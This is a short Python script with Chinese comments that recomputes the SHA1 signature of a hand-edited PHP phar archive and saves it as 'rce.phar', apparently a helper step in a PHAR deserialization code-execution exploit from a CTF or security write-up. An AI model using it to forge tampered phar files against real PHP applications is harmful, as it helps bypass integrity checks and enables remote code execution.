#
# php 生成正常的raw.phar,editor 010更改其中的数据
# 运行calcSig.py生成新签名后的phar文件
#  

from hashlib import sha1
f = open('./raw.phar', 'rb').read() # 修改内容后的phar文件
s = f[:-28] # 获取要签名的数据
print(s)
h = f[-8:] # 获取签名类型以及GBMB标识
newf = s+sha1(s).digest()+h # 数据 + 签名 + 类型 + GBMB
open('rce.phar', 'wb').write(newf) # 写入新文件
